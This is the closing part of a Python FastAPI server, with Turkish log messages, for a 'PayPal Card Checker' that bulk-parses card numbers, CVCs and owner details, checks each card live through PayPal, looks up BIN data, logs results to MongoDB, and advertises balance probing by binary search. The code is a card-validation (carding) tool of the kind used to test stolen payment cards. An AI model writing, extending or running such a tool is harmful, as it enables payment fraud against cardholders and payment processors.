            raise HTTPException(status_code=400, detail="Dosyada geçerli kart bulunamadı")

        processor = PayPalProcessor()
        results = []
        for card in cards:
            result = processor.process_card(card)
            results.append(result)

        total = len(results)
        verified = sum(1 for r in results if r.get('success') and r.get('status') == 'VERIFIED')
        failed = sum(1 for r in results if not r.get('success'))

        return {
            "success": True,
            "total": total,
            "verified": verified,
            "failed": failed,
            "results": results
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f'❌ Dosya işleme hatası: {str(e)}')
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/parse", tags=["Parser"])
async def parse_only(parse_request: ParseRequest):
    try:
        cards = CardParser.parse(parse_request.data)
        return {
            "success": True,
            "count": len(cards),
            "cards": [
                {
                    "number": card.number,
                    "exp_month": card.exp_month,
                    "exp_year": card.exp_year,
                    "cvc": card.cvc,
                    "name": card.name,
                    "email": card.email,
                    "phone": card.phone,
                    "country": card.country,
                    "zip": card.zip
                } for card in cards
            ]
        }
    except Exception as e:
        logger.error(f'❌ Parse hatası: {str(e)}')
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/bin/{card_number}", tags=["BIN"])
async def bin_check(card_number: str):
    try:
        if not mongo_db:
            raise HTTPException(status_code=500, detail="MongoDB bağlantısı yok")
        clean_number = re.sub(r'[^0-9]', '', card_number)
        bin_info = mongo_db.get_bin_info(clean_number)
        if not bin_info:
            raise HTTPException(
                status_code=404,
                detail={
                    "error": "BIN bulunamadı",
                    "bin_prefix": clean_number[:6]
                }
            )
        return {"success": True, "bin_info": bin_info}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f'❌ BIN API hatası: {str(e)}')
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/check/{check_id}", tags=["Records"])
async def get_check_record(check_id: str):
    try:
        if not mongo_db:
            raise HTTPException(status_code=500, detail="MongoDB bağlantısı yok")
        record = mongo_db.get_record(check_id)
        if not record:
            raise HTTPException(status_code=404, detail="Kayıt bulunamadı")
        return {"success": True, "record": record}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f'❌ Sorgulama hatası: {str(e)}')
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/stats", tags=["Stats"])
async def get_stats():
    try:
        if not mongo_db:
            raise HTTPException(status_code=500, detail="MongoDB bağlantısı yok")
        stats = mongo_db.get_stats()
        return {"success": True, "stats": stats}
    except Exception as e:
        logger.error(f'❌ İstatistik hatası: {str(e)}')
        raise HTTPException(status_code=500, detail=str(e))

# ==================== SUNUCUYU BAŞLAT ====================

if __name__ == '__main__':
    port = int(os.getenv('PORT', 3000))
    debug = os.getenv('DEBUG', 'False').lower() == 'true'

    print('=' * 70)
    print('🏦 PayPal Card Checker API (Live + Balance + Bin) v11.0.0')
    print('=' * 70)
    print(f'📍 Sunucu: http://localhost:{port}')
    print(f'📚 Swagger Docs: http://localhost:{port}/docs')
    print(f'📖 ReDoc: http://localhost:{port}/redoc')
    print(f'🔧 Debug: {debug}')
    print(f'🌍 Environment: LIVE')
    print(f'💳 Live Check + Balance Check (Binary Search) + Bin Check')
    print(f'🔐 PayPal Client ID: {CONFIG["paypal_client_id"][:10]}...')
    print(f'📦 MongoDB: {CONFIG["mongo_database"]}/{CONFIG["mongo_collection"]}')
    print('=' * 70)

    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port,
        reload=debug,
        log_level="info"
    )